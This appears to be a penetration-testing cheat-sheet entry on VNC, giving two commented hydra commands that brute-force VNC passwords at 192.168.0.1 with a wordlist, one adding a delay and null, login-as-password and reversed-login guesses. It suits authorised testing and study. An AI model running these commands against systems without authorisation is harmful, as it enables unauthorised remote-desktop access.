# VNC

### Bruteforce
```bash
# -V verbose: show attempts
# -P path to file containing passwords (one per line)
hydra -V -P /usr/share/wordlists/dirb/small.txt 192.168.0.1 vnc

# -c 5 wait 5 seconds between each attempt
# -e try “n” null password, “s” login as pass and/or “r” reversed login
hydra -V -c 5 -e nsr -P /usr/share/wordlists/dirb/small.txt 192.168.0.1 vnc
```
